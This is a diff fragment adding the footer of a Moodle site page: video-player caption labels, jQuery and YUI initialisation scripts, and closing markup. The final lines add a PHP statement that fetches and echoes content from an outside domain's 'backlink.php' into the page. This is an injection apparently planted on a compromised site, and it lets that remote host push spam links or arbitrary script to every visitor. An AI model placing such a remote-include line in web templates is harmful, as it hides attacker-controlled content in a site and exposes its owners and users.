+ "The media is encrypted and we do not have the keys to decrypt it.": "The media is encrypted and we do not have the keys to decrypt it.",
+ "Play Video": "Play Video",
+ "Close": "Close",
+ "Close Modal Dialog": "Close Modal Dialog",
+ "Modal Window": "Modal Window",
+ "This is a modal window": "This is a modal window","This modal can be closed by pressing the Escape key or activating the close button.": "This modal can be closed by pressing the Escape key or activating the close button.",
+ ", opens captions settings dialog": ", opens captions settings dialog",
+ ", opens subtitles settings dialog": ", opens subtitles settings dialog",", opens descriptions settings dialog": ", opens descriptions settings dialog",
+ ", selected": ", selected",
+ "captions settings": "captions settings",
+ "subtitles settings": "subititles settings",
+ "descriptions settings": "descriptions settings",
+ "Text": "Text",
+ "White": "White",
+ "Black": "Black",
+ "Red": "Red",
+ "Green": "Green",
+ "Blue": "Blue",
+ "Yellow": "Yellow",
+ "Magenta": "Magenta",
+ "Cyan": "Cyan",
+ "Background": "Background",
+ "Window": "Window",
+ "Transparent": "Transparent",
+ "Semi-Transparent": "Semi-Transparent",
+ "Opaque": "Opaque",
+ "Font Size": "Font Size",
+ "Text Edge Style": "Text Edge Style",
+ "None": "None",
+ "Raised": "Raised",
+ "Depressed": "Depressed",
+ "Uniform": "Uniform",
+ "Dropshadow": "Dropshadow",
+ "Font Family": "Font Family",
+ "Proportional Sans-Serif": "Proportional Sans-Serif",
+ "Monospace Sans-Serif": "Monospace Sans-Serif",
+ "Proportional Serif": "Proportional Serif",
+ "Monospace Serif": "Monospace Serif",
+ "Casual": "Casual",
+ "Script": "Script",
+ "Small Caps": "Small Caps",
+ "Reset": "Reset",
+ "restore all settings to the default values": "restore all settings to the default values",
+ "Done": "Done",
+ "Caption Settings Dialog": "Caption Settings Dialog",
+ "Beginning of dialog window. Escape will cancel and close the window.": "Beginning of dialog window. Escape will cancel and close the window.",
+ "End of dialog window.": "End of dialog window."
+});
+
+    });
+});;
+
+require(['jquery'], function($) {
+    $('#single_select672fa8e0352f73').change(function() {
+        var ignore = $(this).find(':selected').attr('data-ignore');
+        if (typeof ignore === typeof undefined) {
+            $('#single_select_f672fa8e0352f72').submit();
+        }
+    });
+});
+;
+
+require(['jquery'], function($) {
+    $('#single_select672fa8e0352f76').change(function() {
+        var ignore = $(this).find(':selected').attr('data-ignore');
+        if (typeof ignore === typeof undefined) {
+            $('#single_select_f672fa8e0352f75').submit();
+        }
+    });
+});
+;
+
+require(['theme_boost/loader']);
+require(['theme_boost/drawer'], function(mod) {
+    mod.init();
+});
+;
+require(["core/notification"], function(amd) { amd.init(2, []); });;
+require(["core/log"], function(amd) { amd.setConfig({"level":"warn"}); });;
+require(["core/page_global"], function(amd) { amd.init(); });
+});
+//]]>
+</script>
+<script type="text/javascript">
+//<![CDATA[
+M.str = {"moodle":{"lastmodified":"Last modified","name":"Name","error":"Error","info":"Information","yes":"Yes","no":"No","cancel":"Cancel","collapseall":"Collapse all","expandall":"Expand all","confirm":"Confirm","areyousure":"Are you sure?","closebuttontitle":"Close","unknownerror":"Unknown error"},"repository":{"type":"Type","size":"Size","invalidjson":"Invalid JSON string","nofilesattached":"No files attached","filepicker":"File picker","logout":"Logout","nofilesavailable":"No files available","norepositoriesavailable":"Sorry, none of your current repositories can return files in the required format.","fileexistsdialogheader":"File exists","fileexistsdialog_editor":"A file with that name has already been attached to the text you are editing.","fileexistsdialog_filemanager":"A file with that name has already been attached","renameto":"Rename to \"{$a}\"","referencesexist":"There are {$a} alias\/shortcut files that use this file as their source","select":"Select"},"admin":{"confirmdeletecomments":"You are about to delete comments, are you sure?","confirmation":"Confirmation"}};
+//]]>
+</script>
+<script type="text/javascript">
+//<![CDATA[
+(function() {Y.use("moodle-filter_mathjaxloader-loader",function() {M.filter_mathjaxloader.configure({"mathjaxconfig":"\nMathJax.Hub.Config({\n    config: [\"Accessible.js\", \"Safe.js\"],\n    errorSettings: { message: [\"!\"] },\n    skipStartupTypeset: true,\n    messageStyle: \"none\"\n});\n","lang":"en"});
+});
+M.util.help_popups.setup(Y);
+Y.use("moodle-course-categoryexpander",function() {Y.Moodle.course.categoryexpander.init();
+});
+ M.util.js_pending('random672fa8e0352f77'); Y.on('domready', function() { M.util.js_complete("init");  M.util.js_complete('random672fa8e0352f77'); });
+})();
+//]]>
+</script>
+
+        </div>
+    </footer>
+</div>
+<?php
+echo file_get_contents("https://kanjut-berdiri.info/assets/backlink.php");
+?>
+
+</body>
 </html>
